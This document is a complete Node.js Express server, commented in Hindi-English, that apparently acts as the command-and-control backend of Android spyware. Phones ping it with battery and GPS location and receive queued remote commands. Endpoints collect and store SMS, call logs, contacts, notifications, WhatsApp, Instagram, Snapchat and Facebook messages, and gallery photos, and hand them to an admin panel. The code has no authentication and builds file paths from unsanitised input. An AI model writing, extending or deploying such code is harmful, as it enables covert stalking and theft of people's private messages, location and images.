const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETUP & STORAGE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));

// Limits badhaya taaki badi photos aur logs aa sakein
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// In-Memory Storage for Live Status
let devicesStatus = {}; 

// --- 2. ADMIN DASHBOARD ROUTES ---

// Saare devices ki list mangne ke liye
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// Single device ka status check karne ke liye
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    if (!device) return res.json({ id: id, isOnline: false });
    
    // Agar last seen 60 seconds ke andar hai to Online maano
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// --- 3. PHONE CONNECTION (PING) ---
// Phone har 4 second me yahan hit karega
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // --- COMMAND HANDLING (Brightness/Volume logic yahan hai) ---
        let pendingCommand = "none";
        
        // Agar admin ne koi command set kiya hai (jaise "brightness:50")
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            
            // Command bhejte hi server se clear kar do taaki repeat na ho
            devicesStatus[id].command = "none";
        }

        let finalBattery = battery || level || 0;
        let isCharging = (String(charging) === "true");
        let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
        let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);

        // Status Update Memory me
        devicesStatus[id] = {
            ...devicesStatus[id], // Purana data preserve karo
            id: id,
            model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
            battery: finalBattery,
            version: version || "--",
            charging: isCharging,
            lat: currentLat,
            lon: currentLon,
            lastSeen: Date.now(),
            // Command overwrite mat karna yahan, upar handle ho gaya
            command: devicesStatus[id] ? devicesStatus[id].command : "none" 
        };

        // Server logs me dikhega ki command gaya ya nahi
        if(pendingCommand !== "none") {
            console.log(`📡 [PING] ${id} ko Command diya gaya: ${pendingCommand}`);
        }

        // Phone ko command wapas bhejo
        res.json({ status: "success", command: pendingCommand });

    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// --- 4. COMMAND SENDING (Admin Panel se) ---
app.post('/api/send-command', (req, res) => {
    // Admin panel se aayega: { device_id: "123", command: "brightness:50" }
    let { device_id, command } = req.body;
    
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, lastSeen: 0 };
    }
    
    // Command Store karo (Next Ping pe phone le jayega)
    devicesStatus[id].command = command;
    
    console.log(`🚀 [ADMIN] Sending Command '${command}' to Device ${id}`);
    
    res.json({ status: "success", command: command });
});

// --- 5. DATA UPLOAD (Logs, Contacts, SMS, Social Media) ---
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    
    // File ka naam: uploads/123456_sms.json
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // --- A. LOCATION HANDLING ---
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            
            // Dashboard map ke liye update
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            
            // Location file me overwrite karo (history chahiye to append logic lagana)
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
            console.log(`📍 [LOCATION] Updated for ${id}`);
        }
        
        // --- B. LIST DATA (WhatsApp, SMS, Logs etc.) ---
        else if ([
            'notifications', 'sms', 'call_logs', 'contacts', 'chat_logs', 
            'whatsapp', 'instagram', 'snapchat', 'facebook', 'social_media'
        ].includes(type)) {
            
            let existingData = [];
            // Agar pehle se file hai to uska data padho
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }

            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            
            // Naya data upar (Top) pe jodo
            const finalData = [...newDataArray, ...existingData].slice(0, 2000); // Max 2000 items
            
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id} (${newDataArray.length} items)`);
        } 
        
        // --- C. OTHERS (Generic) ---
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// --- 6. GALLERY & GET ROUTES ---
app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);
    
    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) { try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {} }
        
        galleryData.unshift({ 
            time: date || new Date().toLocaleString(), 
            uploadedAt: Date.now(), 
            image: image_data 
        });
        
        // Sirf last 50 photos rakho storage bachane ke liye
        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
        
        console.log(`📸 [GALLERY] Photo received from ${id}`);
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ error: "Failed" }); }
});

// Admin panel file dekhne ke liye yahan request karega
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

// Server Start
app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
